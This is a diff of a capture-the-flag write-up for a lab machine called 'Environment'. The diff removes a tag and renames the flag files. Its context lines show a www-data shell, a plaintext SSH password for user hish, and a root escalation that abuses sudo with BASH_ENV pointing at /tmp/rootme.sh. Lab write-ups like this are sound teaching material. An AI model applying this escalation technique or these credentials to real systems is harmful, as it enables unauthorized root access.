@@ -1,7 +1,7 @@
 ---
 title: Environment
 slug: Environment
-tags: [Linux, Environment-Manipulation, CVE-2024-52301, MIME-Type-Bypass, File-Upload-Attacks, Environment-Variables, GPG-Decryption, Vulnerability Research]
+tags: [Environment-Manipulation, CVE-2024-52301, MIME-Type-Bypass, File-Upload-Attacks, Environment-Variables, GPG-Decryption, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -256,9 +256,9 @@ www-data@environment:/home/hish$ ls
 ls
 backup
 exp.sh
-user.txt
-www-data@environment:/home/hish$ cat user.txt
-cat user.txt
+local-proof.txt
+www-data@environment:/home/hish$ cat local-proof.txt
+cat local-proof.txt
 <REDACTED>
 ```
 ## Privilege Escalation Path
@@ -289,7 +289,7 @@ drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
 -rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
 drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
 -rwxr-xr-x 1 hish hish    8 Aug  5 01:03 exp.sh
--rw-r--r-- 1 root hish   33 Aug  4 20:02 user.txt
+-rw-r--r-- 1 root hish   33 Aug  4 20:02 local-proof.txt
 www-data@environment:/home/hish$ cd .gnupg
 cd .gnupg
 www-data@environment:/home/hish/.gnupg$ ls
@@ -385,7 +385,7 @@ Now SSH into `hish:marineSPm@ster!!`.
 └─$ ssh hish@environment.htb
 <SNIP>
 hish@environment:~$ ls
-backup  exp.sh  user.txt
+backup  exp.sh  local-proof.txt
 hish@environment:~$ sudo -l
 [sudo] password for hish:
 Matching Defaults entries for hish on environment:
@@ -456,7 +456,7 @@ chmod +x /tmp/rootme.sh
 hish@environment:~$ sudo BASH_ENV=/tmp/rootme.sh /usr/bin/systeminfo
 root@environment:/home/hish# id
 uid=0(root) gid=0(root) groups=0(root)
-root@environment:/home/hish# cat /root/root.txt
+root@environment:/home/hish# cat /root/privileged-proof.txt
 <REDACTED>
 ```
 
